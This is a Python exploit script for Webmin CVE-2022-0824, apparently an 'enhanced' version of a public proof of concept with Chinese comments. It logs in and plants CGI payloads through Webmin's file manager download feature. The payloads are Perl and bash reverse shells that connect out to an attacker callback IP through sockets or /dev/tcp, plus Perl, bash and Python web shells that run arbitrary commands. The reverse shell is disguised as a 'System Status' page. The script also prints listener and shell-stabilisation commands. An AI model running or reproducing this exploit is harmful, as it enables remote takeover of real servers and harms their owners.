#!/usr/bin/python3
 
"""
Coded by: @faisalfs10x
GitHub: https://github.com/faisalfs10x
Reference: https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/
Enhanced version with direct command execution capability - Fixed file overwrite issue
""" 
 
import requests
import urllib3
import argparse
import os
import time
import re
import html
import base64
import hashlib
from urllib.parse import urljoin, urlparse
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
TGREEN =  '\033[32m'
TRED =  '\033[31m' 
TCYAN =  '\033[36m' 
TSHELL =  '\033[32;1m' 
TYELLOW = '\033[33m'
ENDC = '\033[m'
 
class Exploit(object):
    def __init__(self, target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname, shell_command=None):
        self.target = target.rstrip('/')  # 移除末尾的斜杠
        self.username = username
        self.password = password
        self.py3http_server = py3http_server
        self.pyhttp_port = pyhttp_port
        self.upload_path = upload_path
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.fname = fname
        self.shell_command = shell_command  # 新增：直接执行的命令
        self.session_id = None
 
        self.s = requests.Session()
        # 设置通用headers
        self.s.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def generate_unique_filename(self):
        """为每个命令生成唯一的文件名"""
        if self.shell_command:
            # 基于命令内容生成哈希
            command_hash = hashlib.md5(self.shell_command.encode()).hexdigest()[:8]
            timestamp = str(int(time.time()))[-6:]  # 时间戳后6位
            self.fname = f"cmd_{command_hash}_{timestamp}.cgi"
            print(TCYAN + f"[+] Generated unique filename: {self.fname}", ENDC)

    def check_target(self):
        """检查目标是否可达"""
        print(TCYAN + f"[+] Checking if target {self.target} is reachable...", ENDC)
        try:
            r = self.s.get(self.target, verify=False, timeout=10)
            print(TGREEN + f"[+] Target is reachable (Status: {r.status_code})", ENDC)
            if "webmin" in r.text.lower() or "login" in r.text.lower():
                print(TGREEN + "[+] Webmin service detected", ENDC)
            else:
                print(TYELLOW + "[!] Warning: This might not be a Webmin service", ENDC)
            return True
        except requests.exceptions.RequestException as e:
            print(TRED + f"[-] Target unreachable: {e}", ENDC)
            return False

    def cleanup_old_files(self):
        """清理服务器上的旧文件"""
        print(TCYAN + "[+] Cleaning up old command files on server...", ENDC)
        
        # 尝试删除可能存在的旧文件
        old_files = ["cmd_exec.cgi", "cmd_bash.cgi", "cmd_python.cgi"]
        
        for old_file in old_files:
            delete_url = f"{self.target}/extensions/file-manager/delete.cgi?module=filemin"
            data = {
                'name': old_file,
                'path': self.upload_path
            }
            
            try:
                r = self.s.post(delete_url, data=data, verify=False, timeout=10)
                if r.status_code == 200:
                    print(f"[DEBUG] Attempted to delete {old_file}")
            except:
                pass
 
    def gen_payload(self):
        if self.shell_command:
            # 生成唯一文件名
            self.generate_unique_filename()
            # 清理旧文件
            self.cleanup_old_files()
            # 生成命令执行payload
            self.gen_command_payload()
        else:
            # 生成反向shell payload
            self.gen_reverse_shell_payload()

    def gen_command_payload(self):
        """生成直接命令执行的payload"""
        # 对命令进行安全处理
        safe_command = self.shell_command.replace('"', '\\"').replace("'", "\\'")
        
        # Perl版本的命令执行payload
        payload_perl = f'''#!/usr/bin/perl

# 输出CGI头部
print "Content-Type: text/html\\r\\n\\r\\n";
print "<html><head><title>Command Execution Result</title>";
print "<style>body{{font-family:monospace;background:#000;color:#0f0;padding:20px;}}";
print "pre{{background:#111;padding:10px;border:1px solid #333;overflow-x:auto;}}</style>";
print "</head><body>";
print "<h2>Command Execution Result</h2>";
print "<p><strong>Command:</strong> {safe_command}</p>";
print "<p><strong>Timestamp:</strong> " . localtime() . "</p>";
print "<pre>";

# 刷新输出缓冲区
$| = 1;

# 执行命令并输出结果
my $command = "{safe_command}";
my $result = `$command 2>&1`;

# 对输出进行HTML转义
$result =~ s/&/&amp;/g;
$result =~ s/</&lt;/g;
$result =~ s/>/&gt;/g;
$result =~ s/"/&quot;/g;

print $result;
print "</pre>";
print "<hr>";
print "<p><em>Command executed successfully at " . localtime() . "</em></p>";
print "</body></html>";
'''
        
        # Bash版本的命令执行payload
        bash_fname = f"cmd_bash_{int(time.time())}.cgi"
        bash_payload = f'''#!/bin/bash

echo "Content-Type: text/html"
echo ""
echo "<html><head><title>Command Result</title>"
echo "<style>body{{font-family:monospace;background:#000;color:#0f0;padding:20px;}}"
echo "pre{{background:#111;padding:10px;border:1px solid #333;}}</style>"
echo "</head><body>"
echo "<h2>Command Execution Result</h2>"
echo "<p><strong>Command:</strong> {safe_command}</p>"
echo "<p><strong>Timestamp:</strong> $(date)</p>"
echo "<pre>"

# 执行命令
{safe_command} 2>&1

echo "</pre>"
echo "<hr>"
echo "<p><em>Command executed at $(date)</em></p>"
echo "</body></html>"
'''

        # Python版本的命令执行payload
        python_fname = f"cmd_python_{int(time.time())}.cgi"
        escaped_command = html.escape(safe_command)
        python_payload = f'''#!/usr/bin/python3

import subprocess
import html
import datetime

print("Content-Type: text/html\\n")
print("""<html><head><title>Command Execution</title>
<style>
body {{font-family:monospace;background:#000;color:#0f0;padding:20px;}}
pre {{background:#111;padding:10px;border:1px solid #333;overflow-x:auto;}}
</style></head><body>""")

print("<h2>Command Execution Result</h2>")
print(f"<p><strong>Command:</strong> {escaped_command}</p>")
print(f"<p><strong>Timestamp:</strong> {{datetime.datetime.now()}}</p>")
print("<pre>")

try:
    result = subprocess.run('{safe_command}', shell=True, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    print(html.escape(output))
    print("</pre>")
    print(f"<p><strong>Return Code:</strong> {{result.returncode}}</p>")
except subprocess.TimeoutExpired:
    print("Command timed out after 30 seconds")
    print("</pre>")
except Exception as e:
    print(f"Error executing command: {{html.escape(str(e))}}")
    print("</pre>")

print(f"<hr><p><em>Executed at {{datetime.datetime.now()}}</em></p>")
print("</body></html>")
'''
        
        print(TCYAN + f"\n[+] Generating command execution payload for: {self.shell_command}", ENDC)
        
        # 写入主payload (Perl)
        with open(self.fname, "w") as f:
            f.write(payload_perl)
        print(TGREEN + f"[+] Perl command payload written to {self.fname}", ENDC)
        
        # 写入备用payloads
        with open(bash_fname, "w") as f:
            f.write(bash_payload)
        print(TGREEN + f"[+] Bash command payload written to {bash_fname}", ENDC)
        
        with open(python_fname, "w") as f:
            f.write(python_payload)
        print(TGREEN + f"[+] Python command payload written to {python_fname}", ENDC)
        
        # 保存备用文件名以便后续使用
        self.backup_files = [bash_fname, python_fname]

    def gen_reverse_shell_payload(self):
        """生成反向shell payload（原有功能）"""
        # 使用最稳定的payload组合 - 支持多种shell类型
        payload_perl = f'''#!/usr/bin/perl

# 输出CGI头部
print "Content-Type: text/html\\r\\n\\r\\n";
print "<html><head><title>System Status</title></head><body>";
print "<h2>System Check in Progress...</h2>";
print "<p>Please wait...</p>";

# 刷新输出缓冲区
$| = 1;

# 后台执行反向shell
if (fork() == 0) {{
    use Socket;
    socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
    if(connect(S,sockaddr_in({self.callback_port},inet_aton("{self.callback_ip}")))) {{
        open(STDIN,">&S");
        open(STDOUT,">&S"); 
        open(STDERR,">&S");
        exec("/bin/bash -i");
    }};
    exit(0);
}}

# 继续输出页面内容
sleep(1);
print "<p>Status: <span style='color:green'>Connected</span></p>";
print "<script>setTimeout(function(){{window.close();}}, 3000);</script>";
print "</body></html>";
'''
        
        print(TCYAN + f"\n[+] Generating reverse shell payload", ENDC)
        with open(f"{self.fname}", "w") as f:
            f.write(payload_perl)
        print(TGREEN + f"[+] Reverse shell payload written to {self.fname}", ENDC)
        
        # 同时生成备用的bash payload
        bash_payload = f'''#!/bin/bash

echo "Content-Type: text/html"
echo ""
echo "<html><body><h1>System Status</h1><p>Connecting...</p></body></html>"

# 后台执行反向shell
(bash -i >& /dev/tcp/{self.callback_ip}/{self.callback_port} 0>&1 &) 2>/dev/null

# 保持CGI脚本运行
sleep 2
'''
        
        bash_fname = "revshell_bash.cgi"
        with open(bash_fname, "w") as f:
            f.write(bash_payload)
        print(TGREEN + f"[+] Backup bash payload written to {bash_fname}", ENDC)
        self.backup_files = [bash_fname]
 
    def login(self):
        print(TCYAN + f"\n[+] Attempting to login with credentials: {self.username}:{self.password}", ENDC)
        
        # 首先获取登录页面以获取任何必要的tokens
        login_page_url = f"{self.target}/"
        try:
            r = self.s.get(login_page_url, verify=False, timeout=10)
            print(f"[DEBUG] Login page status: {r.status_code}")
        except Exception as e:
            print(TRED + f"[-] Failed to get login page: {e}", ENDC)
            return False
        
        # 尝试登录
        login_url = f"{self.target}/session_login.cgi"
        
        # 准备登录数据
        data = {
            'user': self.username,
            'pass': self.password
        }
        
        print(f"[DEBUG] Login URL: {login_url}")
        print(f"[DEBUG] Login data: {data}")
        
        try:
            r = self.s.post(login_url, data=data, verify=False, allow_redirects=True, timeout=10)
            
            print(f"[DEBUG] Status Code: {r.status_code}")
            print(f"[DEBUG] Final URL: {r.url}")
            print(f"[DEBUG] Response length: {len(r.text)}")
            
            # 保存响应以供调试
            with open("login_response.html", "w") as f:
                f.write(r.text)
            
            # 检查是否登录成功 - 更准确的检测
            if r.status_code == 200:
                # 如果URL包含main或者响应中包含logout，通常表示登录成功
                if ('main' in r.url.lower() or 
                    'logout' in r.text.lower() or 
                    'system information' in r.text.lower() or
                    'webmin main menu' in r.text.lower() or
                    'dashboard' in r.text.lower()):
                    print(TGREEN + "[+] Login Successful", ENDC)
                    
                    # 提取session信息
                    cookies = self.s.cookies.get_dict()
                    print(f"[DEBUG] Session cookies: {cookies}")
                    return True
                else:
                    print(TRED + "[-] Login Failed - No success indicators found", ENDC)
                    print(f"[DEBUG] Response preview: {r.text[:300]}...")
                    return False
            else:
                print(TRED + f"[-] Login Failed - Status: {r.status_code}", ENDC)
                return False
                
        except requests.exceptions.RequestException as e:
            print(TRED + f"[-] Login request failed: {e}", ENDC)
            return False

    def check_filemanager_access(self):
        """检查文件管理器是否可访问"""
        print(TCYAN + "\n[+] Checking file manager access...", ENDC)
        filemanager_url = f"{self.target}/filemin/"
        
        try:
            r = self.s.get(filemanager_url, verify=False, timeout=10)
            print(f"[DEBUG] File manager status: {r.status_code}")
            
            if r.status_code == 200 and 'filemin' in r.text.lower():
                print(TGREEN + "[+] File manager is accessible", ENDC)
                return True
            else:
                print(TYELLOW + "[!] File manager may not be available", ENDC)
                print(f"[DEBUG] Response preview: {r.text[:200]}...")
                return False
                
        except Exception as e:
            print(TRED + f"[-] Failed to access file manager: {e}", ENDC)
            return False

    def force_upload_file(self, filename):
        """强制上传文件，覆盖已存在的文件"""
        print(TCYAN + f"[+] Force uploading {filename}...", ENDC)
        
        # 首先尝试删除已存在的文件
        delete_url = f"{self.target}/extensions/file-manager/delete.cgi?module=filemin"
        delete_data = {
            'name': filename,
            'path': self.upload_path
        }
        
        try:
            r = self.s.post(delete_url, data=delete_data, verify=False, timeout=10)
            print(f"[DEBUG] Delete attempt for {filename}: {r.status_code}")
        except:
            pass
        
        # 然后上传新文件
        upload_url = f"{self.target}/filemin/upload.cgi"
        
        try:
            with open(filename, 'rb') as f:
                files = {'file': (filename, f, 'application/octet-stream')}
                data = {'path': self.upload_path}
                
                r = self.s.post(upload_url, files=files, data=data, verify=False, timeout=15)
                print(f"[DEBUG] Force upload response status: {r.status_code}")
                
                if r.status_code == 200:
                    print(TGREEN + f"[+] Force upload of {filename} successful", ENDC)
                    return True
                    
        except Exception as e:
            print(f"[DEBUG] Force upload failed: {e}")
        
        return False

    def alternative_upload_method(self):
        """尝试替代的上传方法"""
        print(TCYAN + "\n[+] Trying alternative upload methods...", ENDC)
        
        # 方法1: 强制上传主文件
        if self.force_upload_file(self.fname):
            return True
        
        # 方法2: 尝试上传备用文件
        if hasattr(self, 'backup_files'):
            for backup_file in self.backup_files:
                if os.path.exists(backup_file):
                    if self.force_upload_file(backup_file):
                        self.fname = backup_file  # 切换到成功上传的文件
                        return True
        
        # 方法3: 尝试通过命令执行创建文件
        return self.try_command_execution()

    def try_command_execution(self):
        """尝试通过命令执行创建payload"""
        print(TCYAN + "\n[+] Trying command execution method...", ENDC)
        
        # 读取payload内容
        try:
            with open(self.fname, 'r') as f:
                payload_content = f.read()
        except:
            return False
        
        # 尝试通过系统命令创建文件
        command_urls = [
            f"{self.target}/proc/",
            f"{self.target}/shell/",
            f"{self.target}/command.cgi",
            f"{self.target}/webmin/command.cgi",
        ]
        
        for cmd_url in command_urls:
            try:
                # 使用base64编码避免特殊字符问题
                encoded_payload = base64.b64encode(payload_content.encode()).decode()
                
                # 创建文件的命令
                create_cmd = f"echo '{encoded_payload}' | base64 -d > {self.upload_path}/{self.fname}"
                chmod_cmd = f"chmod +x {self.upload_path}/{self.fname}"
                
                data = {'cmd': create_cmd}
                r = self.s.post(cmd_url, data=data, verify=False, timeout=10)
                
                if r.status_code == 200:
                    print(f"[DEBUG] Command execution attempt at {cmd_url}")
                    # 尝试设置权限
                    data = {'cmd': chmod_cmd}
                    self.s.post(cmd_url, data=data, verify=False, timeout=10)
                    print(TGREEN + "[+] Command execution method may have succeeded", ENDC)
                    return True
                    
            except Exception as e:
                continue
        
        return False
 
    def pyhttp_server(self):
        print(TCYAN + f'\n[+] Starting HTTP server on port {self.pyhttp_port}', ENDC)
        
        # 检查端口是否已被占用
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', int(self.pyhttp_port)))
        sock.close()
        
        if result == 0:
            print(TYELLOW + f"[!] Port {self.pyhttp_port} is already in use, killing existing process", ENDC)
            os.system(f'kill -9 $(lsof -t -i:{self.pyhttp_port}) 2>/dev/null')
            time.sleep(2)
        
        os.system(f'(setsid $(which python3) -m http.server {self.pyhttp_port} 0>&1 & ) ') 
        print(TGREEN + '[+] Waiting 3 seconds for HTTP server to start...', ENDC)
        time.sleep(3)
        
        # 验证HTTP服务器是否启动成功
        try:
            test_response = requests.get(f"http://127.0.0.1:{self.pyhttp_port}", timeout=5)
            print(TGREEN + "[+] HTTP server is running successfully", ENDC)
            return True
        except:
            print(TRED + "[-] Failed to start HTTP server", ENDC)
            return False
 
    def download_remote_url(self):
        download_url = f"{self.target}/extensions/file-manager/http_download.cgi?module=filemin"
        headers = { 
            "Accept": "application/json, text/javascript, */*; q=0.01", 
            "Accept-Encoding": "gzip, deflate", 
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
            "X-Requested-With": "XMLHttpRequest", 
            "Referer": f"{self.target}/filemin/?xnavigation=1" 
        }
 
        data = { 
            'link': f"http://{self.py3http_server}/{self.fname}", 
            'username': '', 
            'password': '', 
            'path': self.upload_path 
        }

        print(TCYAN + f"\n[+] Attempting to download {self.fname} from HTTP server", ENDC)
        print(f"[DEBUG] Download URL: {download_url}")
        print(f"[DEBUG] Payload URL: http://{self.py3http_server}/{self.fname}")
        
        try:
            r = self.s.post(download_url, data=data, headers=headers, verify=False, allow_redirects=True, timeout=15)
            print(f"[DEBUG] Download response status: {r.status_code}")
            
            # 检查是否又被重定向到登录页面
            if 'session_login' in r.text or 'login' in r.url.lower():
                print(TRED + "[-] Session expired, trying alternative methods", ENDC)
                return self.alternative_upload_method()
            
            if r.status_code == 200:
                if 'error' in r.text.lower() and 'already exists' in r.text.lower():
                    print(TYELLOW + f"[!] File already exists, forcing upload...", ENDC)
                    return self.alternative_upload_method()
                else:
                    print(TGREEN + "[+] File download request appears successful", ENDC)
                    return True
            else:
                print(TYELLOW + f"[!] Download may have failed: {r.text[:200]}...", ENDC)
                return self.alternative_upload_method()
                
        except requests.exceptions.RequestException as e:
            print(TRED + f"[-] Download request failed: {e}", ENDC)
            return self.alternative_upload_method()
 
    def modify_permission(self):
        modify_perm_url = f"{self.target}/extensions/file-manager/chmod.cgi?module=filemin&page=1&paginate=30"
        headers = {"Referer": f"{self.target}/filemin/?xnavigation=1"}
        data = {"name": self.fname, "perms": "0755", "applyto": "1", "path": self.upload_path}
       
        print(TCYAN + f"[+] Attempting to modify permissions of {self.fname}", ENDC)
        
        try:
            r = self.s.post(modify_perm_url, data=data, headers=headers, verify=False, allow_redirects=True, timeout=10)
            
            if 'session_login' not in r.text:
                print(TGREEN + "[+] Permission modification completed", ENDC)
                return True
            else:
                print(TYELLOW + "[!] Permission modification may have failed (session issue)", ENDC)
                # 尝试通过命令行修改权限
                return self.chmod_via_command()
                
        except requests.exceptions.RequestException as e:
            print(TRED + f"[-] Permission modification failed: {e}", ENDC)
            return self.chmod_via_command()

    def chmod_via_command(self):
        """通过命令执行修改文件权限"""
        print(TCYAN + "[+] Trying to modify permissions via command execution", ENDC)
        
        command_urls = [
            f"{self.target}/proc/",
            f"{self.target}/shell/",
            f"{self.target}/command.cgi",
        ]
        
        chmod_cmd = f"chmod +x {self.upload_path}/{self.fname}"
        
        for cmd_url in command_urls:
            try:
                data = {'cmd': chmod_cmd}
                r = self.s.post(cmd_url, data=data, verify=False, timeout=10)
                if r.status_code == 200:
                    print(TGREEN + "[+] Permission modified via command execution", ENDC)
                    return True
            except:
                continue
        
        print(TYELLOW + "[!] Could not modify permissions, but file may still be executable", ENDC)
        return False

    def execute_command(self):
        """执行命令并获取结果"""
        if not self.shell_command:
            return self.exec_revshell()
            
        print(TCYAN + f"\n[+] Executing command: {self.shell_command}", ENDC)
        
        # 尝试多个可能的payload位置
        payload_urls = [
            f"{self.target}/{self.fname}",
        ]
        
        # 添加备用文件URL
        if hasattr(self, 'backup_files'):
            for backup_file in self.backup_files:
                payload_urls.append(f"{self.target}/{backup_file}")
        
        for url in payload_urls:
            print(f"[DEBUG] Trying command execution at: {url}")
            try:
                r = self.s.get(url, verify=False, allow_redirects=True, timeout=30)
                
                if r.status_code == 200:
                    if ("Command Execution Result" in r.text or 
                        "Command Result" in r.text or 
                        "Command:" in r.text):
                        print(TGREEN + f"\n[+] Command executed successfully!", ENDC)
                        print(TGREEN + "="*60, ENDC)
                        
                        # 提取命令输出
                        self.parse_command_output(r.text)
                        print(TGREEN + "="*60, ENDC)
                        return True
                    else:
                        print(TYELLOW + f"[!] Unexpected response from {url}", ENDC)
                        print(f"[DEBUG] Response preview: {r.text[:300]}...")
                else:
                    print(TRED + f"[-] HTTP {r.status_code} from {url}", ENDC)
                    
            except requests.Timeout:
                print(TYELLOW + f"[!] Command execution timed out at {url}", ENDC)
            except requests.exceptions.RequestException as e:
                print(f"[DEBUG] Request failed for {url}: {e}")
                continue
        
        print(TRED + "[-] All command execution attempts failed", ENDC)
        return False

    def parse_command_output(self, html_content):
        """从HTML响应中提取命令输出"""
        try:
            # 使用正则表达式提取<pre>标签中的内容
            pre_match = re.search(r'<pre>(.*?)</pre>', html_content, re.DOTALL)
            if pre_match:
                output = pre_match.group(1)
                # HTML解码
                output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&').replace('&quot;', '"')
                print(output.strip())
            else:
                # 如果没有找到<pre>标签，尝试提取整个响应
                print("Raw response:")
                print(html_content)
        except Exception as e:
            print(f"Error parsing output: {e}")
            print("Raw response:")
            print(html_content[:1000] + "..." if len(html_content) > 1000 else html_content)
 
    def exec_revshell(self):
        """执行反向shell（原有功能）"""
        # 尝试多个可能的shell位置
        shell_urls = [
            f"{self.target}/{self.fname}",
            f"{self.target}/filemin/{self.fname}",
            f"{self.target}/unauthenticated/{self.fname}",
        ]
        
        print(TCYAN + f"\n[+] Attempting to execute reverse shell", ENDC)
        print(TGREEN + f"[+] Make sure you have a listener running: nc -nlvp {self.callback_port}", ENDC)
        print(TYELLOW + f"[!] Recommended listener commands:", ENDC)
        print(f"    nc -nlvp {self.callback_port}")
        print(f"    socat TCP-LISTEN:{self.callback_port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane")
        
        for url in shell_urls:
            print(f"[DEBUG] Trying shell URL: {url}")
            try:
                r = self.s.get(url, verify=False, allow_redirects=True, timeout=5)
                
                # 检查响应内容
                if r.status_code == 200:
                    if "System Check in Progress" in r.text or "System Status" in r.text:
                        print(TGREEN + f"[+] CGI script executed successfully at {url}!", ENDC)
                        print(TGREEN + f"[+] Check your listener for incoming connection", ENDC)
                        time.sleep(2)  # 给shell时间连接
                        return True
                    elif "Error" in r.text and "Missing Headers" in r.text:
                        print(TYELLOW + f"[!] CGI headers issue at {url}, but shell may still work", ENDC)
                    else:
                        print(TRED + f"[-] Unexpected response from {url}", ENDC)
                        print(f"[DEBUG] Response: {r.text[:200]}...")
                else:
                    print(TRED + f"[-] HTTP {r.status_code} from {url}", ENDC)
                
            except requests.Timeout:
                print(TGREEN + f"\n[+] TIMEOUT: Shell likely spawned from {url}!", ENDC)
                print(TGREEN + f"[+] This is normal - check your listener!", ENDC)
                return True
            except (requests.exceptions.ConnectionError, 
                    requests.exceptions.ChunkedEncodingError) as e:
                # 这些异常通常表示shell成功执行并断开了连接
                if ("Connection aborted" in str(e) or 
                    "Remote end closed connection" in str(e) or
                    "Connection broken" in str(e)):
                    print(TGREEN + f"\n[+] CONNECTION DROPPED: Shell likely spawned from {url}!", ENDC)
                    print(TGREEN + f"[+] Connection terminated (normal for reverse shell)", ENDC)
                    print(TGREEN + f"[+] Check your listener at {self.callback_ip}:{self.callback_port}", ENDC)
                    return True
                else:
                    print(f"[DEBUG] Connection error at {url}: {e}")
                    continue
            except requests.exceptions.RequestException as e:
                print(f"[DEBUG] Request to {url} failed: {e}")
                continue
        
        print(TRED + f"[-] All shell execution attempts completed", ENDC)
        print(TYELLOW + f"[!] If you received a connection, the exploit worked!", ENDC)
        print(TYELLOW + f"[!] Try manually accessing: {self.target}/{self.fname}", ENDC)
        return False

    def manual_shell_instructions(self):
        """提供手动执行shell的说明"""
        print(TCYAN + "\n[+] Manual Shell Execution Instructions:", ENDC)
        if self.shell_command:
            print(f"1. Visit: {self.target}/{self.fname}")
            if hasattr(self, 'backup_files'):
                print(f"2. Alternative URLs to try:")
                for backup_file in self.backup_files:
                    print(f"   - {self.target}/{backup_file}")
            print(f"3. Command output should be displayed in the browser")
        else:
            print(f"1. Start listener: nc -nlvp {self.callback_port}")
            print(f"2. Visit: {self.target}/{self.fname}")
            print(f"3. Alternative URLs to try:")
            print(f"   - {self.target}/filemin/{self.fname}")
            print(f"   - {self.target}/unauthenticated/{self.fname}")
            print(f"4. If you get 'Missing Headers' error, the shell may still work")
            print(f"5. Shell stabilization commands after connection:")
            print("   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
            print("   export TERM=xterm")
            print("   stty raw -echo; fg")
 
    def do_cleanup(self):
        print(TCYAN + '\n[+] Cleaning up...', ENDC)
        print(f'[+] Killing HTTP server on port {self.pyhttp_port}')
        os.system(f'kill -9 $(lsof -t -i:{self.pyhttp_port}) 2>/dev/null')
        
        # 清理生成的文件
        files_to_clean = [self.fname]
        
        if hasattr(self, 'backup_files'):
            files_to_clean.extend(self.backup_files)
            
        for file in files_to_clean:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Removed payload file: {file}")
        
        if os.path.exists("login_response.html"):
            print(f"[+] Login response saved in login_response.html for analysis")
        
        print(TGREEN + "[+] Cleanup completed", ENDC)
 
    def run(self):
        if self.shell_command:
            print(TGREEN + "="*70, ENDC)
            print(TGREEN + "    Webmin CVE-2022-0824 Command Execution Exploit", ENDC)
            print(TGREEN + f"              Command: {self.shell_command}", ENDC)
            print(TGREEN + "="*70, ENDC)
        else:
            print(TGREEN + "="*70, ENDC)
            print(TGREEN + "    Webmin CVE-2022-0824 Reverse Shell Exploit", ENDC)
            print(TGREEN + "              (Enhanced CGI-Compliant Version)", ENDC)
            print(TGREEN + "="*70, ENDC)
        
        # 检查目标可达性
        if not self.check_target():
            print(TRED + "[-] Target check failed, exiting...", ENDC)
            return
        
        # 生成payload
        self.gen_payload()
        
        # 尝试登录
        if not self.login():
            print(TRED + "[-] Login failed, exiting...", ENDC)
            return
        
        # 检查文件管理器访问权限
        filemanager_ok = self.check_filemanager_access()
        
        # 启动HTTP服务器
        if not self.pyhttp_server():
            print(TRED + "[-] Failed to start HTTP server, exiting...", ENDC)
            return
        
        # 尝试上传文件
        upload_success = False
        if filemanager_ok:
            upload_success = self.download_remote_url()
        else:
            upload_success = self.alternative_upload_method()
        
        if upload_success:
            if self.shell_command:
                print(TGREEN + "\n[+] Command payload upload successful!", ENDC)
            else:
                print(TGREEN + "\n[+] Reverse shell payload upload successful!", ENDC)
            
            # 修改权限
            self.modify_permission()
            
            # 执行命令或反向shell
            exec_success = self.execute_command()
            
            if not exec_success:
                self.manual_shell_instructions()
        else:
            print(TRED + "[-] File upload failed", ENDC)
            print(TYELLOW + "[!] You may need to try manual upload or different credentials", ENDC)
        
        # 提供最终说明
        print(TCYAN + f"\n[+] Exploit completed. Key URLs to try manually:", ENDC)
        if self.shell_command:
            print(f"   - {self.target}/{self.fname}")
            if hasattr(self, 'backup_files'):
                for backup_file in self.backup_files:
                    print(f"   - {self.target}/{backup_file}")
        else:
            print(f"   - {self.target}/{self.fname}")
            print(f"   - {self.target}/filemin/{self.fname}")
        
        # 清理
        if not self.shell_command:  # 如果是反向shell模式，等待用户输入
            input(TYELLOW + "\nPress Enter to cleanup and exit..." + ENDC)
        else:
            print(TYELLOW + "\nCleaning up automatically..." + ENDC)
            time.sleep(2)
        self.do_cleanup()
 
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Webmin CVE-2022-0824 Exploit (Enhanced with Command Execution - Fixed File Overwrite)')
    parser.add_argument('-t', '--target', type=str, required=True, help='Target full URL, http://webmin.local:10000')
    parser.add_argument('-c', '--credential', type=str, required=True, help='Format: user:password')
    parser.add_argument('-LS', '--py3http_server', type=str, required=True, help='HTTP server for serving payload, ex: 192.168.1.100:8080')
    parser.add_argument('-L', '--callback_ip', type=str, required=False, help='Callback IP to receive reverse shell (required for reverse shell mode)')
    parser.add_argument('-P', '--callback_port', type=str, required=False, help='Callback port to receive reverse shell (required for reverse shell mode)')
    parser.add_argument('--shell', type=str, required=False, help='Command to execute directly (e.g., "ls -la", "whoami", "cat /etc/passwd")')
    parser.add_argument("-V",'--version', action='version', version='%(prog)s 5.0 (Fixed File Overwrite Issue)')
    args = parser.parse_args()
    
    # 验证参数
    if args.shell:
        # 命令执行模式
        callback_ip = "127.0.0.1"  # 占位符
        callback_port = "9999"     # 占位符
        shell_command = args.shell
        print(TCYAN + "[+] Command Execution Mode Enabled", ENDC)
    else:
        # 反向shell模式
        if not args.callback_ip or not args.callback_port:
            print(TRED + "[-] Error: -L and -P are required for reverse shell mode", ENDC)
            print(TYELLOW + "[!] Use --shell 'command' for direct command execution", ENDC)
            exit(1)
        callback_ip = args.callback_ip
        callback_port = args.callback_port
        shell_command = None
        print(TCYAN + "[+] Reverse Shell Mode Enabled", ENDC)
    
    target = args.target
    username = args.credential.split(':')[0]
    password = args.credential.split(':')[1]
    py3http_server = args.py3http_server
    pyhttp_port = py3http_server.split(':')[1]
    upload_path = "/usr/share/webmin"
    
    if shell_command:
        fname = "cmd_exec.cgi"  # 初始文件名，会被generate_unique_filename()修改
    else:
        fname = "revshell.cgi"
    
    print(TCYAN + f"[+] Target: {target}", ENDC)
    print(TCYAN + f"[+] Credentials: {username}:{password}", ENDC)
    print(TCYAN + f"[+] HTTP Server: {py3http_server}", ENDC)
    if shell_command:
        print(TCYAN + f"[+] Command: {shell_command}", ENDC)
    else:
        print(TCYAN + f"[+] Callback: {callback_ip}:{callback_port}", ENDC)
    print(TCYAN + f"[+] Upload Path: {upload_path}", ENDC)
    
    if not shell_command:
        print(TYELLOW + f"\n[!] IMPORTANT: Start your listener before running:", ENDC)
        print(f"    nc -nlvp {callback_port}")
        print(f"    # OR for better stability:")
        print(f"    socat TCP-LISTEN:{callback_port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane")
        input(TGREEN + "\nPress Enter to continue..." + ENDC)
    else:
        print(TGREEN + f"\n[+] Ready to execute command: {shell_command}", ENDC)
        input(TGREEN + "Press Enter to continue..." + ENDC)
 
    pwn = Exploit(target, username, password, py3http_server, pyhttp_port, upload_path, callback_ip, callback_port, fname, shell_command)
    pwn.run()


